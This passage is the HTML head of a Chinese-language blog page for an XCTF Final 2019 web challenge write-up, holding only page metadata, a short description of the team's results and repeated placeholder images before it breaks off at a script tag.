<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>XCTF Final 2019 Web Write Up - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。"><meta property="og:type" content="article"><meta property="og:title" content="XCTF Final 2019 Web Write Up"><meta property="og:url" content="https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。"><meta property="og:locale" content="en_US"><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="article:published_time" content="2019-11-14T00:02:53.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.720Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script 